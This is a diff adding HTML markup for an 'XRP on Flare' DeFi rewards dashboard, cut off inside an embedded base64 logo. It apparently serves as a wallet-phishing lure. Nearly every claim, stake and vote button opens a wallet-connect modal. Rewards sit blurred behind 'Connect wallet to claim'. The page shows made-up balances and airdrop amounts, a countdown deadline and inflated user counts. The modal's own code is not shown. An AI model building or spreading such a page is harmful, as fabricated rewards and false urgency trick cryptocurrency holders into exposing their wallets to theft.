+        <div class="pool"><div class="pp"><span style="background:var(--xrpdim);color:var(--xrp);">F</span><span style="background:rgba(38,161,123,.2);">$</span></div><div class="pi"><div class="pn">FXRP / USDC</div><div class="ps">Uniswap V3 · $8.1M TVL</div></div><span class="apy">21.7%</span></div>
+        <div class="pool"><div class="pp"><span style="background:var(--xrpdim);color:var(--xrp);">X</span><span style="background:rgba(249,115,22,.2);">F</span></div><div class="pi"><div class="pn">XRP / FLR</div><div class="ps">Flare DEX · $5.2M TVL</div></div><span class="apy">16.3%</span></div>
+        <div class="pool"><div class="pp"><span style="background:var(--xrpdim);color:var(--xrp);">F</span><span style="background:rgba(98,126,234,.2);">Ξ</span></div><div class="pi"><div class="pn">FXRP / ETH</div><div class="ps">Curve · $3.8M TVL</div></div><span class="apy">12.9%</span></div>
+      </div>
+      <div class="slbl">XRP Staking</div>
+      <div class="card">
+        <div class="tok"><div class="tic xic">XRP</div><div><div class="tn">XRP Flare Stake</div><div class="tsub">2,000 XRP · Flexible · +18 XRP pending</div></div><span class="tag tg">6.1%</span></div>
+        <div class="tok"><div class="tic" style="background:var(--xrpdim);color:var(--xrp);">FX</div><div><div class="tn">FXRP Staking</div><div class="tsub">1,000 FXRP · 30-day lock</div></div><span class="tag tx">8.4%</span></div>
+      </div>
+      <div class="slbl">FXRP Yield Farming</div>
+      <div class="card">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;"><div class="tn">FXRP/USDT Farm · Flare DEX</div><span class="tag ta">34.7% APR</span></div>
+        <div class="tsub">2,000 FXRP LP deposited · Earned: <span class="up" style="font-weight:600;">320 XRP ($187)</span></div>
+        <div style="font-size:10px;color:var(--fg);margin:7px 0 3px;">Vest progress — 68%</div>
+        <div class="pb"><div class="pf xbar" style="width:68%"></div></div>
+        <button class="cbtn xbtn" onclick="showWalletModal()">Claim XRP Farming Rewards</button>
+      </div>
+      <div class="slbl">XRP Lending</div>
+      <div class="card">
+        <div class="tok"><div class="tic xic">XRP</div><div><div class="tn">XRP Supply · Aave on Flare</div><div class="tsub">500 XRP · $12.80/mo interest</div></div><span class="tag tg">9.2%</span></div>
+        <div class="tok"><div class="tic" style="background:var(--xrpdim);color:var(--xrp);">FX</div><div><div class="tn">FXRP Collateral</div><div class="tsub">Borrowed 200 USDT · 3.8% rate</div></div><span class="tag tb">Active</span></div>
+      </div>
+    </div>
+
+    <!-- REWARDS -->
+    <div class="pnl" id="p-rewards">
+
+      <!-- Always visible orb header -->
+      <div class="card" style="text-align:center;margin-bottom:13px;">
+        <div class="ftag">XRP Rewards on Flare</div>
+        <div class="orb-w"><div class="orb"></div></div>
+        <div class="ostat"><div class="on2">FlareDrops + XRP Yield + Airdrops</div><div class="ol">Wrap FLR · Hold FXRP · Earn XRP</div></div>
+      </div>
+
+      <!-- ── LOCKED STATE ── -->
+      <div id="rewards-gate">
+
+        <!-- Blurred preview of rewards -->
+        <div style="position:relative;margin-bottom:11px;">
+          <div style="filter:blur(6px);pointer-events:none;user-select:none;">
+            <div class="rcard xcard">
+              <div class="rtit xc">⬡ FlareDrop — Monthly XRP Reward</div>
+              <div class="rsub">Wrap FLR to earn automatic XRP-equivalent drops</div>
+              <div class="rrow"><span class="rk">Wrapped FLR</span><span class="rv xv">•,••• FLR</span></div>
+              <div class="rrow"><span class="rk">Est. XRP reward</span><span class="rv up">~•• XRP</span></div>
+              <div class="pb"><div class="pf xbar" style="width:52%"></div></div>
+            </div>
+            <div class="rcard xcard" style="margin-top:8px;">
+              <div class="rtit xc">XRP Ecosystem Airdrop</div>
+              <div class="rsub">XRPL DeFi participation reward</div>
+              <div class="rrow"><span class="rk">Eligible XRP</span><span class="rv up">••• XRP</span></div>
+              <div class="rrow"><span class="rk">USD value</span><span class="rv up">~$•••</span></div>
+              <div class="pb"><div class="pf xbar" style="width:22%"></div></div>
+            </div>
+            <div class="card" style="margin-top:8px;">
+              <div class="tok"><div class="tic xic">XRP</div><div><div class="tn">XRP Staking Reward</div><div class="tsub">6.1% APY · •,••• XRP</div></div><div class="trr"><div class="tp2 up">+•• XRP</div><span class="tag tg">Pending</span></div></div>
+              <div class="tok"><div class="tic" style="background:var(--xrpdim);color:var(--xrp);">FX</div><div><div class="tn">FXRP Farm Rewards</div><div class="tsub">34.7% APR · •,••• FXRP LP</div></div><div class="trr"><div class="tp2 up">+••• XRP</div><span class="tag tg">Pending</span></div></div>
+            </div>
+          </div>
+          <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;">
+            <div style="background:rgba(255,255,255,0.92);border:1px solid var(--fbc);border-radius:12px;padding:8px 18px;font-size:11px;font-weight:600;color:var(--fg);display:flex;align-items:center;gap:6px;">🔒 Connect wallet to view rewards</div>
+          </div>
+        </div>
+
+        <!-- Connect CTA -->
+        <div style="background:linear-gradient(135deg,#fff,var(--xrplight));border:1.5px dashed rgba(52,106,169,.3);border-radius:14px;padding:22px 16px;text-align:center;">
+          <div style="font-size:28px;margin-bottom:10px;">🪂</div>
+          <div style="font-size:14px;font-weight:600;color:var(--fd);margin-bottom:5px;">Unlock Your XRP Rewards</div>
+          <div style="font-size:11px;color:var(--fg);line-height:1.6;margin-bottom:14px;">Connect your wallet to view FlareDrops,<br>airdrops, staking rewards and governance.</div>
+          <button onclick="showWalletModal()" style="width:100%;padding:12px;background:linear-gradient(135deg,#346AA9,#1a4a7a);color:#fff;border:none;border-radius:11px;font-size:13px;font-weight:600;cursor:pointer;">🔗 Connect Wallet to Claim</button>
+        </div>
+      </div>
+
+      <!-- ── CONNECTED STATE ── -->
+      <div id="rewards-connected" style="display:none;">
+        <div class="slbl">🪂 FlareDrops (XRP-denominated)</div>
+        <div class="rcard xcard">
+          <div class="rtit xc">⬡ FlareDrop — Monthly XRP Reward</div>
+          <div class="rsub">Wrap FLR to earn automatic XRP-equivalent drops</div>
+          <div class="rrow"><span class="rk">Wrapped FLR</span><span class="rv xv">4,200 FLR</span></div>
+          <div class="rrow"><span class="rk">Next drop date</span><span class="rv">Apr 1, 2026</span></div>
+          <div class="rrow"><span class="rk">Estimated XRP reward</span><span class="rv up">~72 XRP (~$42)</span></div>
+          <div style="font-size:10px;color:var(--fg);margin-top:7px;margin-bottom:3px;">Month progress — 52%</div>
+          <div class="pb"><div class="pf xbar" style="width:52%"></div></div>
+          <div class="btn-row"><button class="cbtn xbtn" onclick="showWalletModal()">Wrap More FLR</button><button class="cbtn xout">View History</button></div>
+        </div>
+        <div class="slbl">🎁 XRP Airdrops</div>
+        <div class="rcard xcard">
+          <div class="rtit xc">XRP Ecosystem Airdrop</div>
+          <div class="rsub">XRPL DeFi participation reward</div>
+          <div class="rrow"><span class="rk">Eligible XRP</span><span class="rv up">840 XRP</span></div>
+          <div class="rrow"><span class="rk">USD value</span><span class="rv up">~$490</span></div>
+          <div class="rrow"><span class="rk">Deadline</span><span class="rv dn">April 15, 2026</span></div>
+          <div style="font-size:10px;color:var(--fg);margin-top:7px;margin-bottom:3px;">31 days remaining</div>
+          <div class="pb"><div class="pf xbar" style="width:22%"></div></div>
+          <button class="cbtn xbtn" onclick="showWalletModal()">Claim XRP Airdrop →</button>
+        </div>
+        <div class="rcard xcard">
+          <div class="rtit xc">FXRP Minter Reward</div>
+          <div class="rsub">Reward for minting FXRP and contributing to TVL</div>
+          <div class="rrow"><span class="rk">Claimable XRP</span><span class="rv up">120 XRP (~$70)</span></div>
+          <div class="rrow"><span class="rk">Source</span><span class="rv">FXRP minting incentive</span></div>
+          <button class="cbtn xout" onclick="showWalletModal()">Claim FXRP Reward</button>
+        </div>
+        <div class="slbl">💎 XRP Staking Rewards</div>
+        <div class="card">
+          <div class="tok"><div class="tic xic">XRP</div><div><div class="tn">XRP Flare Stake</div><div class="tsub">6.1% APY · 2,000 XRP</div></div><div class="trr"><div class="tp2 up">+18 XRP</div><span class="tag tg">Pending</span></div></div>
+          <div class="tok"><div class="tic" style="background:var(--xrpdim);color:var(--xrp);">FX</div><div><div class="tn">FXRP Farm Rewards</div><div class="tsub">34.7% APR · 2,000 FXRP LP</div></div><div class="trr"><div class="tp2 up">+320 XRP</div><span class="tag tg">Pending</span></div></div>
+          <button class="cbtn xbtn" onclick="showWalletModal()">Claim All XRP Rewards</button>
+        </div>
+        <div class="slbl">🗳️ XRP Governance</div>
+        <div class="card">
+          <div class="fdesc" style="margin-bottom:10px;">Vote on XRPFi proposals and shape the future of XRP on Flare.</div>
+          <div class="tok"><div><div class="tn">FIP-16: XRP Pool Fee Reduction</div><div class="tsub">Ends Apr 3 · 81% YES</div></div><span class="tag tg">Open</span></div>
+          <div class="tok"><div><div class="tn">FIP-17: New FXRP Collateral Ratio</div><div class="tsub">Ends Apr 8 · 68% YES</div></div><span class="tag tg">Open</span></div>
+          <button class="cbtn xout" onclick="showWalletModal()">Cast Your Vote →</button>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- AI BOT -->
+    <div class="pnl" id="p-bot">
+      <div class="tgstrip">
+        <div class="tgic">✈</div>
+        <div><div class="tgt">Also on <strong>Telegram</strong> · @FlareXRPBot</div><div class="tgs">XRPFi Smart Money · 142,000+ users</div></div>
+        <button class="tgbtn">Open</button>
+      </div>
+      <div class="chat-box">
+        <div class="chat-head">
+          <div class="bav" style="padding:3px;"><img src="data:image/png;base64,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" alt="Flare" style="width:100%;height:100%;object-fit:contain;"></div>
+          <div><div class="chat-name">Flare XRP AI Assistant</div><div class="chat-sub">XRPFi · Smart Money · Always on</div></div>
+          <div class="online">Online</div>
+        </div>
+        <div class="cmsgs" id="cmsgs">
+          <div class="mb">
+            <div class="bavs" style="padding:2px;"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAYAAACtWK6eAAAX1ElEQVR4nO3d6Y9c15nf8e85d62q7uqFzaVJiRQXibI2arVs2R5qvHEyGdjQRLEzL4JgXgwQI0D+gAR5myDv8taTxAgMTAZJxhYsxxZmtHhGnpE91mJRokRqoUhRXLrZa3V3Vd26955z8qKq2EVLvm2lJVZX9fMBCt1k9XJv9f3VWe6951HOOYQQH033ewOE2MokIEIUkIAIUUACIkQBCYgQBSQgQhSQgAhRQAIiRAEJiBAFJCBCFJCACFFAAiJEAQmIEAUkIEIUkIAIUUACIkQBCYgQBSQgQhSQgAhRQAIiRAEJiBAFJCBCFJCACFFAAiJEAQmIEAUkIEIUkIAIUUACIkQBCYgQBSQgQhSQgAhRQAIiRAEJiBAFJCBCFJCACFFAAiJEAQmIEAUkIEIUkIAIUUACIkQBCYgQBSQgQhSQgAhRQAIiRAEJiBAFJCBCFJCACFHA7/cGbFlnZx2Hd6v8795wANq1H/Q+AKP6+x7j+bb4C2zx82lldFO/348d2iqyxWUCApiYgEhxfmWRWz53p9rUD98CJCBdpy665qWrzL1znpm33mPpwhVaq3VXWc3o/pV1JxTKrX9b1vuPPtDWFD+viwOcKm9Tv79Jg/HKGCQZJslJrCUdi6lPlNn/b/7M6RODHZLtHZAzs45Xz/H+yVO889JJkisL7FARkzZgbC0hra1RLVeufblV1xoOXPfP7rIbvtnXscUB3Sgggd1cC1gnI4pWcQZUbtsBySMuJatoXd7Uz94Ktm1AzP/+e/eLp56h8upFTLPFeDMlbFkqJmfU+VS8kHJlilnbxKl2ILoBMXo9KH5/GxC0HxY+bzfoYsXe5lqQSJVoWUtuckpBjK9hJfJZNCvgpZv62VvB9gvI35x0L/z3v2Tp129zcGQS7+IScRwzWqoSlDzyVkpab7JmmiQqw+mecCgw3bDQ/qg3OAA/dRt08ewGz6+pzR3EcabBV+BrcpfTWE1Y9JrYAyOwf3JTP3sr2FYBef8//oV7+8mnGZmrc4eLCa+sMLVrmlqtxsLMVdCKuFImGIkAaFpLJWkHoNulsj2fA3huc+/Am5W7zY1Bkk22gKXMkCqNrzRhZtGZo9bI2b97NxzZOdDjD9gmAWn+9Wvu9BNPs/bL15iupUwHI8QO0sBy4dIHxHHMjqlJtNY0m02S5RU8zyOKIvLOyPy6gbpbf+NWmxzkbpbeYAykNwhApDZ3CPghtDxHZnNKXsjEaJValDJ58MCmfu5WMfQByX76ujv1k+eYff4V9tcte1WGWVpjIW/glyPCagWTGxqNBqHyKKGphhV8FJ7RvBM00a4dkO5Ub/ffAGqTffjNMkHx89bmhc+HmzwEEhKSMKBlHSbLKeFY1jkHDuzZ1M/dKoY6IMmPfu1e/vf/mcjAkRRKDlp5AqGHjkcxgGcVaB80pEDae5IDw6hdf4n0dS1H++MGk0ifujDf3J/Q6g1aoA2GWN6aZcyPMDbETw2rSULl8A52Hzm0qe3aKob2THrjp6+6U0/9jMhAaMC34HUO8O5BbhV4tvghipmRiIXVGk4r5lpr1HdV8I7uQ3/l7oEff8CwBuT0nHvriaeZffZXjKRQziDKwTcf3mG1wWO7605x/7ZHPYQojlmrrcDkCG+FTfb800f6vdmfmKEMyPv/5ylaL59mXy2jlEGcQ2DWWxBYH0tIC7I5xlrGShWUsSQlj9bBKUY/e3u/N+sTM3QBaf2v593ZnzzH+FLC/rDc7l71tBzdKVrl2oERxTZqQWKrMM0WpdERLjZrPPDNrxHctm9oGt/hGqS/cdWdefIZSjMrVInB5NeSYeG6PlN3LGKG7i3ik2U3ONT9zNEkYyFyVO85zC2fu/eGbNeNMlQBufLM8yy/+g4HvRIkKXWVo3R07XndM0jXtD/mQ/Ne1z9rJc3CjoD7v/UHcPctQ/WKDs37p33jknvtb1+g1DKMeiFZ3sLGfvvaKbX+6O1i6U4LUvQQxbwwYMEmTNxzhMqx2/q9OZ+4oWlB9LOvMH7qMlXjMW8TcqUZyTyM8q6NN7pnlXMNrW4fuvg82sa/d8DHMdqun+h0XH/dGcBIrU44McaKyllImijfYzQsERuPwMAra/McfPwrHPrOY3Dn/qFqPWCIAvL2q68T2Pb5jtDzKZUr0MpQnoem54anDqf6f5JvK+h9Cbqh0D3nSr2pcVaaTZK0xWRcJoxL1JsNltImURRx+MQX2PPgnXD/gaELBwxLQF4579577U1u9SLCNEM5SykOadZbePr6S0Susetnw7ez3m7kdVcKdP5vtrFCCY8KIVHLoT1LM4xIyj6r5YgHvv1V1O3Dcd3VRxmKgNTOnIVagzFvCqxhrdXEOvBR2J5wyLTuh/WOybp6L8yMgxiz2iRSIWNjVa7kTd5szlN68HYeeuwE6rEHh/ptZigCcv7km0x4Ma6eEFjQxtFqNomCEDnXV6z3xGlX91OrwDVTdu7YiTGGM7U5ZkagcvxejnzrBKVvHR/qcMCQBGTm7XNMO01SWyWMS8RRRDNLQ